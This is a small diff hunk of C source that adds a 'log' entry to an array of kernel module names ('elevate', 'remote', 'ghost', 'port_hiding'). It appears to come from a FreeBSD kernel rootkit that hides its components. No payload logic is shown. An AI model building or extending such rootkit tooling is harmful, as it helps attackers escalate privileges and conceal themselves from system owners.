@@ -39,7 +39,7 @@ struct module {
 };
 
 int linkers_index = 0, module_index = 0;
-char *klds[] = {"elevate", "remote", "ghost", "port_hiding"};
+char *klds[] = {"elevate", "remote", "ghost", "port_hiding", "log"};
 
 static int load(struct module *module, int cmd, void *arg) {
     char *module_name;
